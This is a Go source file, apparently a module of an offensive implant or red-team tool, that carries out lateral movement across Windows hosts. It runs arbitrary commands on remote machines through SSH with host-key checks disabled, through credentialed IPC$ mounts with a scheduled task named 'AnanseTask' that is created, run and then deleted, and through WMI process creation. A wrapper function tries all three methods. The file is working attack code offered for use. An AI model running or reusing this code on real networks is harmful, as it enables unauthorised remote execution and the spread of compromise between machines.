package module

import (
	"fmt"
	"strings"
)

// RunLateralSSH performs SSH-based lateral movement on Windows (if OpenSSH is installed).
func RunLateralSSH(params map[string]interface{}) (string, error) {
	target, _ := params["target"].(string)
	user, _ := params["user"].(string)
	command, _ := params["command"].(string)

	if target == "" || command == "" {
		return "", fmt.Errorf("target and command params required")
	}
	if user == "" {
		user = "Administrator"
	}

	cmds := []string{
		fmt.Sprintf("ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 %s@%s '%s' 2>&1 || echo 'SSH not available on Windows'", escapeSQ(user), escapeSQ(target), escapeSQ(command)),
	}
	return run(strings.Join(cmds, "\n"))
}

// RunLateralPsexec performs PsExec-style remote execution.
func RunLateralPsexec(params map[string]interface{}) (string, error) {
	target, _ := params["target"].(string)
	user, _ := params["user"].(string)
	password, _ := params["password"].(string)
	command, _ := params["command"].(string)

	if target == "" || command == "" {
		return "", fmt.Errorf("target and command params required")
	}

	var cmds []string
	if user != "" && password != "" {
		cmds = append(cmds, fmt.Sprintf("net use \\\\%s\\IPC$ '%s' /u:%s 2>nul", escapeSQ(target), escapeSQ(password), escapeSQ(user)))
	}
	cmds = append(cmds, fmt.Sprintf("schtasks /create /s %s /tn \"AnanseTask\" /tr \"cmd.exe /c '%s'\" /sc once /st 00:00 /f 2>nul", escapeSQ(target), escapeSQ(command)))
	cmds = append(cmds, fmt.Sprintf("schtasks /run /s %s /tn \"AnanseTask\" 2>nul", escapeSQ(target)))
	cmds = append(cmds, fmt.Sprintf("schtasks /delete /s %s /tn \"AnanseTask\" /f 2>nul", escapeSQ(target)))
	if user != "" && password != "" {
		cmds = append(cmds, fmt.Sprintf("net use \\\\%s\\IPC$ /delete 2>nul", escapeSQ(target)))
	}

	return run(strings.Join(cmds, "\n"))
}

// RunLateralWMI performs remote execution via WMI.
func RunLateralWMI(params map[string]interface{}) (string, error) {
	target, _ := params["target"].(string)
	user, _ := params["user"].(string)
	password, _ := params["password"].(string)
	command, _ := params["command"].(string)

	if target == "" || command == "" {
		return "", fmt.Errorf("target and command params required")
	}

	wmicCmd := fmt.Sprintf("wmic /node:\"%s\"", escapeSQ(target))
	if user != "" && password != "" {
		wmicCmd += fmt.Sprintf(" /user:\"%s\" /password:\"%s\"", escapeSQ(user), escapeSQ(password))
	}
	wmicCmd += fmt.Sprintf(" process call create \"cmd.exe /c %s\"", escapeSQ(command))

	return run(wmicCmd)
}

// RunLateralAll runs all lateral movement probes.
func RunLateralAll(params map[string]interface{}) (string, error) {
	var parts []string

	out, err := RunLateralSSH(params)
	if err != nil {
		parts = append(parts, fmt.Sprintf("=== SSH ===\nERROR: %v", err))
	} else {
		parts = append(parts, fmt.Sprintf("=== SSH ===\n%s", out))
	}

	out, err = RunLateralPsexec(params)
	if err != nil {
		parts = append(parts, fmt.Sprintf("=== PSExec ===\nERROR: %v", err))
	} else {
		parts = append(parts, fmt.Sprintf("=== PSExec ===\n%s", out))
	}

	out, err = RunLateralWMI(params)
	if err != nil {
		parts = append(parts, fmt.Sprintf("=== WMI ===\nERROR: %v", err))
	} else {
		parts = append(parts, fmt.Sprintf("=== WMI ===\n%s", out))
	}

	return strings.Join(parts, "\n\n"), nil
}
